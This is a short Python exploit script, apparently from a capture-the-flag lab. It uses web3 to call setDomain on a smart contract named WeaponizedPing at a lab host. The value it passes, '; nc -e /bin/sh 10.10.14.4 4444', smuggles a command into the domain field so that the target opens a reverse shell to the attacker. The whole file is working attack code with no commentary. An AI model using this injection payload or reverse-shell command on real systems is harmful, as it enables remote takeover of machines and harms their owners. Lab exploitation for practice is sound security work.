#!/usr/bin/python3

import json
from web3 import Web3, HTTPProvider

contract_abi = json.loads(open('WeaponizedPing.json', 'r').read())['abi']
contract_address = open('address.txt', 'r').read().rstrip()

w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))
w3.eth.defaultAccount = w3.eth.accounts[0]
contract = w3.eth.contract(address=contract_address, abi=contract_abi)
payload = '; nc -e /bin/sh 10.10.14.4 4444'
contract.functions.setDomain(payload).transact()

